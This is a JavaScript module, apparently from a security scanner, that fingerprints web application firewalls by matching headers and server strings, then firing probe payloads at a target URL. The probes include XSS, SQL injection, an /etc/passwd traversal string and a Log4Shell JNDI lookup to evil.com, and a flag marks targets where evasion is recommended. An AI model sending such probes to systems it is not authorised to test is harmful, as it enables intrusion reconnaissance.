// backend/src/engines/wafDetector.js
// WAF detection and fingerprinting engine
import axios from 'axios';

const WAF_SIGNATURES = [
    { name: 'Cloudflare', headers: ['cf-ray', 'cf-cache-status'], server: /cloudflare/i, body: /cloudflare|ray id/i },
    { name: 'AWS WAF', headers: ['x-amzn-requestid'], server: /awselb/i, body: /aws|amazon/i },
    { name: 'Sucuri', headers: ['x-sucuri-id', 'x-sucuri-cache'], server: /sucuri/i, body: /sucuri/i },
    { name: 'Imperva/Incapsula', headers: ['x-iinfo', 'x-cdn'], server: /imperva|incapsula/i, body: /incapsula|imperva/i },
    { name: 'ModSecurity', headers: [], server: /mod_security|modsecurity/i, body: /mod_security|modsecurity|not acceptable/i },
    { name: 'Akamai', headers: ['x-akamai-transformed'], server: /akamai/i, body: /akamai|reference.*#/i },
    { name: 'F5 BIG-IP', headers: ['x-wa-info'], server: /big-?ip/i, body: /the requested url was rejected/i },
    { name: 'Barracuda', headers: ['barra_counter_session'], server: /barracuda/i, body: /barracuda/i },
    { name: 'Fortinet/FortiWeb', headers: ['fortiwafsid'], server: /fortiweb/i, body: /fortinet|fortigate/i },
    { name: 'DDoS-Guard', headers: [], server: /ddos-guard/i, body: /ddos-guard/i }
];

// Payloads known to trigger WAF blocks
const WAF_PROBE_PAYLOADS = [
    '<script>alert(1)</script>',
    "' OR 1=1--",
    '../../../etc/passwd',
    '${jndi:ldap://evil.com/a}',
    'SELECT * FROM users WHERE 1=1'
];

/**
 * Detect WAF presence and identify vendor
 * @param {string} targetUrl - URL to probe
 * @param {object} options - { timeout }
 * @returns {object} WAF detection result
 */
export async function detectWAF(targetUrl, options = {}) {
    const timeout = options.timeout || 10000;
    const result = {
        detected: false,
        vendor: null,
        confidence: 0,
        evidence: [],
        blockStatusCodes: [],
        evasionRecommended: false
    };

    try {
        // Step 1: Check response headers for WAF signatures
        const normalResp = await axios.get(targetUrl, {
            timeout, validateStatus: () => true,
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        });

        const headers = normalResp.headers;
        const server = headers['server'] || '';
        const headerKeys = Object.keys(headers);

        for (const sig of WAF_SIGNATURES) {
            // Check for WAF-specific headers
            const hasHeader = sig.headers.some(h => headerKeys.includes(h.toLowerCase()));
            const serverMatch = sig.server.test(server);

            if (hasHeader || serverMatch) {
                result.detected = true;
                result.vendor = sig.name;
                result.confidence = 80;
                result.evidence.push(`WAF header/server match: ${sig.name}`);
            }
        }

        // Step 2: Send malicious payloads and check for block responses
        for (const payload of WAF_PROBE_PAYLOADS) {
            try {
                const testUrl = new URL(targetUrl);
                testUrl.searchParams.set('test', payload);
                const probeResp = await axios.get(testUrl.toString(), {
                    timeout, validateStatus: () => true,
                    headers: { 'User-Agent': 'Mozilla/5.0' }
                });

                const blocked = [403, 406, 429, 503].includes(probeResp.status);
                if (blocked) {
                    result.blockStatusCodes.push(probeResp.status);
                    result.detected = true;
                    result.evasionRecommended = true;

                    if (!result.vendor) {
                        const body = typeof probeResp.data === 'string' ? probeResp.data : '';
                        for (const sig of WAF_SIGNATURES) {
                            if (sig.body.test(body)) {
                                result.vendor = sig.name;
                                result.confidence = 90;
                                break;
                            }
                        }
                    }

                    result.evidence.push(`Payload blocked with HTTP ${probeResp.status}: ${payload.substring(0, 30)}...`);
                }
            } catch { /* continue */ }
        }

        if (result.detected && !result.vendor) {
            result.vendor = 'Unknown WAF';
            result.confidence = 60;
        }

        if (result.blockStatusCodes.length > 0) {
            result.confidence = Math.min(result.confidence + 10, 99);
        }

    } catch (err) {
        console.warn(`WAF detection error: ${err.message}`);
    }

    if (result.detected) {
        console.log(`🛡️ WAF Detected: ${result.vendor} (${result.confidence}% confidence)`);
    }

    return result;
}

export default { detectWAF };
